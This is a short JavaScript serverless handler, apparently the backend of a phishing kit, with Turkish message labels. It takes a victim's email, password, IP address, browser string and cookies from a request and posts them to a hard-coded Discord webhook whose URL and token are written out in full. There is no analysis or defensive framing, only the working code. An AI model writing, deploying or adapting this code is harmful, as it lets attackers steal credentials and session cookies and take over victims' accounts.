exports.handler = async (event) => {
  const { username, password, ip, user_agent, cookies } = JSON.parse(event.body);
  const message = `Yeni Güncelleme - ${new Date().toISOString()}:\n**E-posta**: ${username}\n**Şifre**: ${password}\n**IP**: ${ip}\n**Tarayıcı**: ${user_agent}\n**Çerezler**: ${cookies}`;
  const response = await fetch('https://discord.com/api/webhooks/1401473482016952320/bo3vGGbGGcleKPWgvUduIpKXHl9QEqy8TerfzmJUyCeoYDHDQ0YaUVyPAoUexXgp4npb', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: message })
  });
  if (!response.ok) throw new Error('Discord yanıtı başarısız');
  return { statusCode: 200 };
};